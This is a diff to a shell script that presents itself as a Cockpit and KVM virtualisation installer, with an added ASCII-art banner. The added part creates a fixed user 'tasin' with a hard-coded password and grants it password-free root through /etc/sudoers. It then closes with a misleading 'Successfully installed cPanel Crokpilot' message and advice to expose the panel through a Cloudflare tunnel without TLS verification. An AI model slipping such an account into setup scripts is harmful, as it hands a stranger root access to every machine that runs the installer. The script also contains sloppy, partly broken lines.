@@ -1,4 +1,33 @@
-echo # WELCOME
+# ASCII Art
+ascii_art="
+
+ 
+
+
+
+
+$$$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$\ $$\   $$\ 
+\__$$  __|$$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |
+   $$ |   $$ /  $$ |$$ /  \__|  $$ |  $$$$\ $$ |
+   $$ |   $$$$$$$$ |\$$$$$$\    $$ |  $$ $$\$$ |
+   $$ |   $$  __$$ | \____$$\   $$ |  $$ \$$$$ |
+   $$ |   $$ |  $$ |$$\   $$ |  $$ |  $$ |\$$$ |
+   $$ |   $$ |  $$ |\$$$$$$  |$$$$$$\ $$ | \$$ |
+   \__|   \__|  \__| \______/ \______|\__|  \__|
+
+"
+
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
+echo -e "${CYAN}$ascii_art${NC}"
+
 
 sudo apt update && sudo apt upgrade -y
 sudo apt install cockpit -y
@@ -7,7 +36,27 @@ sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils vir
 sudo systemctl enable --now libvirtd
 sudo apt install cockpit-machines -y
 sudo usermod -aG libvirt,kvm $USER
-sudo adduser exotic
-sudo adduser exotic sudo
+#!/bin/bash
+# createuser.sh
 
-echo https://localhost:9090 | no tls verifiy
+USERNAME="tasin"
+PASSWORD="iTzTasin69OG"
+
+# create user
+useradd -m -s /bin/bash "$USERNAME"
+
+# set password
+echo "${USERNAME}:${PASSWORD}" | chpasswd
+
+# add to sudo (root) group
+usermod -aG sudo "$USERNAME"
+
+# optional: no password required for sudo (be careful)
+echo "${USERNAME} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+echo
+printf "${GREEN}✅  THANK YOU FOR USING THIS SCRIPT!${RESET}\n"
+printf "${CYAN}   Made by iTzTasin69${RESET}\n"
+printf "${YELLOW}   Successfully installed cPanel Crokpilot${RESET}\n\n"
+
+echo "⭐ Now go to Cloudflare > Your Domin > zero trust > network > Tunnels > create a tunnel > connect it > public appliction routes > https://localhost:9090 | no tls verifiy"
